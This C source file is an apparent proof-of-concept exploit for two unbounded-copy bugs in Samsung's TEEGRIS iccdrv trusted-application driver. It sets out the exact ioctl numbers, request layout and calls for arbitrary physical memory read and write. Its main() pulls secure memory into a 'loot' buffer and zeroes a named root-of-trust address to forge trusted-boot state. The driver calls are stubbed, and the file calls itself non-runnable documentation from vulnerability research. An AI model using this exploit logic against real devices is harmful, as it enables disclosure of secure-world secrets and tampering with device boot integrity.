/*
 * iccdrv (IcCDrV) — arbitrary physical READ + WRITE via unbounded TEE_MemMove
 * ===========================================================================
 *
 *   *** DOCUMENTATION-GRADE POC — NOT RUNNABLE, NOT COMPILED ON THIS HOST ***
 *
 *   - Binary ABSENT from the emulator's 34-TA TEEGRIS corpus
 *     (absent_drivers.md L33 "494363447256 (iccdrv): ABSENT"; L15).
 *   - TA-to-TA ONLY: the ioctl is gated by a 2-UUID caller allowlist that
 *     admits exactly STST or ICcGRD — there is NO standalone-REE / TEEC
 *     client path to this primitive (iccdrv.md L51-64; absent_drivers.md
 *     L74 "STST or ICcGRD only (2-UUID allowlist) — TA-to-TA, not REE-direct").
 *   - UN-MODELED in the emulator: the surface is a TEEGRIS driver-client
 *     ioctl on /dev/iccc_driver backed by a /dev/phys mmap of physical
 *     memory; the GP-InvokeCommand emulator models none of that, and the
 *     STST front-end that would reach it boot-dies on the un-modeled ICCC
 *     ioctl in-corpus (absent_drivers.md L80-85, L99-104, L193-194).
 *
 *   Therefore this file is NOT a TEEC REE client like the other pocs (it
 *   uses no tee_client_api.h, no repro.h, no emulator socket transport). It
 *   is the *driver-client* code that an allowlisted caller TA (STST or
 *   ICcGRD) would itself run, inside the secure world, to drive iccdrv. It
 *   exists to construct and document — byte-exactly — the two ioctl requests
 *   that trigger BUG-1 (arbitrary phys READ) and BUG-2 (arbitrary phys
 *   WRITE). It does not link against any real TEEGRIS driver-client headers
 *   (absent on this analysis host), so the TEEGRIS-side symbols below are
 *   shown as prototypes/stubs and the file is provided for reading, not
 *   building. See README.md for the full finding and repro status.
 *
 * FINDING (RE/samsung_teegris/iccdrv.md):
 *   iccdrv is a 23 KB TEEGRIS GP TEE *driver* TA (driver name "iccc_driver",
 *   registered via TEES_InitDriver; iccdrv.md L6, L103). Its only meaningful
 *   file-op is .ioctl -> iccc_ioctl @0x25E4 (iccdrv.md L30-33). That handler
 *   exposes raw /dev/phys-backed read/write of an arbitrary, CALLER-SUPPLIED
 *   physical address+length to two trusted TAs (iccdrv.md L9-23):
 *       BUG-1 (HIGH, CONFIRMED-IN-BINARY): icc_phys_read @0x21C4 passes the
 *             caller length a1[1] straight to TEE_MemMove @0x2258 with NO
 *             upper-bound check (iccdrv.md L118-131).
 *       BUG-2 (HIGH, CONFIRMED-IN-BINARY): icc_phys_write @0x234C mirrors it;
 *             a1[1] -> TEE_MemMove size @0x23E0, no check (iccdrv.md L135-148).
 *   => an allowlisted TA passing length = 0xFFFFFFFF reads/writes up to ~4 GB
 *      of whatever the kernel will map (iccdrv.md L129, L146;
 *      absent_drivers.md L15, L91-97).
 */

#include <stdint.h>
#include <stddef.h>

/* ---------------------------------------------------------------------------
 * Constants — every one grounded in RE/samsung_teegris/iccdrv.md
 * ------------------------------------------------------------------------- */

/* iccdrv's own identity (iccdrv.md L3). ASCII tail of the UUID = "IcCDrV". */
#define ICCDRV_UUID_STR   "00000000-0000-0000-0000-494363447256"

/* The TEEGRIS kernel device the caller TA opens to reach this driver. STST
 * names it /dev/iccc_driver (stst_iccc_save/README.md L88; iccdrv driver name
 * "iccc_driver", iccdrv.md L6). */
#define ICCC_DRIVER_DEV   "/dev/iccc_driver"

/*
 * ioctl command numbers (iccdrv.md L38-46; "Correction 2026-06-07" L43-46
 * fixes the earlier 0x70001/0x70002 mistake — the dispatch decompile
 * icc_ioctl_dispatch@0x25E4 does MOV W8,#0x70042 / #0x70041, a2==458817->read,
 * a2==458818->write, so the true values are: ).
 */
#define TZ_SECURE_MEM_READ   0x70041u   /* 458817 -> icc_phys_read  @0x21C4 */
#define TZ_SECURE_MEM_WRITE  0x70042u   /* 458818 -> icc_phys_write @0x234C */

/*
 * Inner-iov requirements enforced by iccc_ioctl before it dispatches either
 * command (iccdrv.md L48-49):
 *   - the iov must carry an {phys_addr, length} tuple of size 24 (a3[1]==24),
 *   - and a non-NULL caller-buffer pointer (a3[2] != NULL).
 */
#define ICCC_IOV_LEN   24u   /* a3[1] must equal 24 (iccdrv.md L49). */

/*
 * The request struct that BOTH handlers read through `a1`. From the read-path
 * decompile (iccdrv.md L81-88):
 *     v6 = *a1   & 0xFFFFF000;     // *a1   == phys_addr   (field @ +0, u32)
 *     v7 = a1[1] + *a1 - v6;       // a1[1] == length      (field @ +4, u32)
 *     ... mmap(... v6) ...
 *     TEE_MemMove(a2, &v8[*a1 & 0xFFF], a1[1]);   // size == a1[1], UNBOUNDED
 * and the asm (iccdrv.md L124-127): LDP W8,W2,[X19] => W8=phys_addr, W2=length.
 * So `a1` points at two consecutive u32s: {phys_addr, length}. The caller
 * buffer is passed separately as `a2` (the iov's a3[2] pointer).
 */
typedef struct {
    uint32_t phys_addr;   /* a1[0] / *a1  : page-aligned via *a1 & 0xFFFFF000 (iccdrv.md L84). */
    uint32_t length;      /* a1[1]        : flows UNCHECKED into TEE_MemMove size (iccdrv.md L86, L121, L126). */
} icc_phys_req_t;         /* sizeof == 8; carried inside the size-24 iov (iccdrv.md L49). */

/* ---------------------------------------------------------------------------
 * TEEGRIS driver-client surface (PROTOTYPES ONLY — headers absent on host).
 *
 * Inside the secure world the allowlisted caller TA reaches iccdrv via the
 * TEEGRIS driver-client ioctl (the same ioctl family STST uses for ICCC, the
 * one that is un-modeled by the emulator; absent_drivers.md L74, L80-85). The
 * exact libteesl entry name is not load-bearing for this finding, so it is
 * stubbed; what matters is the {ioctl number, {phys_addr,length} struct,
 * caller buffer} triple constructed below. We weak-stub it so the file is
 * self-contained for reading; it is never actually invoked (see main()).
 * ------------------------------------------------------------------------- */
extern int  TEES_DriverOpen(const char *dev);                 /* -> driver fd  */
extern int  TEES_DriverIoctl(int fd, unsigned int cmd,        /* a2 == cmd     */
                             const void *iov_req,              /* a1 == {phys,len} */
                             unsigned int iov_len,             /* a3[1] == 24   */
                             void *caller_buf);                /* a3[2] != NULL */
extern void TEES_DriverClose(int fd);

#ifndef HAVE_TEEGRIS_DRIVER_CLIENT          /* always true on this analysis host */
int  TEES_DriverOpen(const char *dev)       { (void)dev; return -1; }
int  TEES_DriverIoctl(int fd, unsigned int cmd, const void *iov_req,
                      unsigned int iov_len, void *caller_buf)
                      { (void)fd;(void)cmd;(void)iov_req;(void)iov_len;(void)caller_buf; return -1; }
void TEES_DriverClose(int fd)               { (void)fd; }
#endif

/* ---------------------------------------------------------------------------
 * BUG-1 — arbitrary PHYSICAL READ  (TZ_SECURE_MEM_READ / 0x70041)
 *
 * The code a compromised STST/ICcGRD would run to siphon `length` bytes from
 * an attacker-chosen physical address into a secure-world buffer it controls.
 * Because icc_phys_read passes `length` (a1[1]) straight to TEE_MemMove with
 * no clamp (iccdrv.md L118-131), `length` may be anything up to 0xFFFFFFFF
 * (~4 GB) — the only ceiling is whatever /dev/phys/mmap will back, which the
 * driver itself never enforces (iccdrv.md L129).
 *
 * Returns the driver's ioctl result (0 == success in the RE's convention).
 * ------------------------------------------------------------------------- */
int icc_arbitrary_phys_read(uint32_t phys_addr, uint32_t length, void *out_buf)
{
    /* a1 : the {phys_addr, length} tuple read by icc_phys_read @0x21C4. */
    icc_phys_req_t req;
    req.phys_addr = phys_addr;     /* mapped via *a1 & 0xFFFFF000 (iccdrv.md L84). */
    req.length    = length;        /* -> TEE_MemMove size, UNBOUNDED (iccdrv.md L86,L121). */

    int fd = TEES_DriverOpen(ICCC_DRIVER_DEV);
    if (fd < 0)
        return -1;

    /*
     * a2 == TZ_SECURE_MEM_READ (0x70041), iov_len == 24 (a3[1], iccdrv.md L49),
     * caller_buf == out_buf (a3[2], must be non-NULL). iccc_ioctl first calls
     * iccc_caller_allowlist (@0x284C) — which passes because *this* code runs
     * inside STST/ICcGRD (iccdrv.md L51-64) — then routes a2==458817 to
     * icc_phys_read, which mmaps /dev/phys at (phys_addr & 0xFFFFF000) and
     * TEE_MemMove(out_buf, mapping + (phys_addr & 0xFFF), length).
     */
    int rc = TEES_DriverIoctl(fd, TZ_SECURE_MEM_READ,
                              &req, ICCC_IOV_LEN, out_buf);

    TEES_DriverClose(fd);          /* read path munmaps+close()s its own fd (iccdrv.md L40, L87). */
    return rc;
}

/* ---------------------------------------------------------------------------
 * BUG-2 — arbitrary PHYSICAL WRITE  (TZ_SECURE_MEM_WRITE / 0x70042)
 *
 * Mirror of BUG-1 (iccdrv.md L135-148): icc_phys_write @0x234C maps the same
 * physical window and does TEE_MemMove(mapping + (phys_addr & 0xFFF),
 * src_buf, length) — dest = mmap_base + (phys_addr & 0xFFF), size = a1[1],
 * still no bound check (iccdrv.md L142-143, L146). A compromised caller can
 * therefore PLANT `length` bytes at any physical address /dev/phys will map.
 *
 * The writeup flags the DualDAR RoT cell at phys 0xBF200594 as a concrete
 * high-value target (iccdrv.md L148; stst_iccc_save/README.md L20-21): a TEE
 * write of 0 there forges trusted-boot state for dulDAR/KEYMST.
 * ------------------------------------------------------------------------- */
int icc_arbitrary_phys_write(uint32_t phys_addr, uint32_t length, const void *src_buf)
{
    icc_phys_req_t req;
    req.phys_addr = phys_addr;     /* same page-align (iccdrv.md L84 pattern, mirrored L154-156). */
    req.length    = length;        /* -> TEE_MemMove size in the write path, UNBOUNDED (iccdrv.md L138,L143). */

    int fd = TEES_DriverOpen(ICCC_DRIVER_DEV);
    if (fd < 0)
        return -1;

    /* a2 == TZ_SECURE_MEM_WRITE (0x70042); src_buf is the caller-side source
     * that TEE_MemMove copies INTO the mapped physical window (iccdrv.md L146). */
    int rc = TEES_DriverIoctl(fd, TZ_SECURE_MEM_WRITE,
                              &req, ICCC_IOV_LEN, (void *)src_buf);

    TEES_DriverClose(fd);
    return rc;
}

/* ---------------------------------------------------------------------------
 * Worked demonstration — what the compromised caller TA would actually issue.
 *
 * This main() is illustrative only; it is NEVER run (the stubbed driver-client
 * returns -1, and the binary is absent / un-modeled — README "REPRO-STATUS").
 * It exists so the byte-exact request constants are visible end to end.
 * ------------------------------------------------------------------------- */
int main(void)
{
    /* ---- (a) ARBITRARY PHYSICAL READ ------------------------------------ */
    /* Drain an attacker-chosen physical range into a caller buffer. The
     * length is intentionally the unbounded-primitive's worst case to show
     * BUG-1 (no clamp): 0xFFFFFFFF would have the driver try ~4 GB
     * (iccdrv.md L129). A realistic disclosure picks the target's true size. */
    static unsigned char loot[0x1000];          /* caller buffer (a3[2], non-NULL). */
    uint32_t read_phys = 0xBF200000u;           /* ICCC/TZASC-adjacent window (iccdrv.md L148 region). */
    uint32_t read_len  = 0xFFFFFFFFu;           /* a1[1] -> TEE_MemMove size, UNBOUNDED (iccdrv.md L129). */
    (void) icc_arbitrary_phys_read(read_phys, read_len, loot);
    /* On hardware, `loot` now holds secure physical memory the caller could
     * never map directly — arbitrary-length physical disclosure (iccdrv.md L131). */

    /* ---- (b) ARBITRARY PHYSICAL WRITE ----------------------------------- */
    /* Plant bytes at an arbitrary physical address. Example: zero the DualDAR
     * Root-of-Trust DWORD at 0xBF200594 to forge trusted-boot state, the exact
     * cell stst/dulDAR/KEYMST bottom out on (iccdrv.md L148;
     * stst_iccc_save/README.md L20-21, L45-46). */
    static const uint32_t forged_rot = 0u;      /* value to plant (dulDAR's "== 0" gate). */
    uint32_t write_phys = 0xBF200594u;          /* DualDAR RoT cell (iccdrv.md L148). */
    uint32_t write_len  = (uint32_t)sizeof(forged_rot);
    (void) icc_arbitrary_phys_write(write_phys, write_len, &forged_rot);
    /* And the unbounded write itself (BUG-2): length = 0xFFFFFFFF would have
     * the driver TEE_MemMove ~4 GB into the mapped window with no clamp
     * (iccdrv.md L146) — shown here only as the primitive's ceiling. */

    return 0;
}
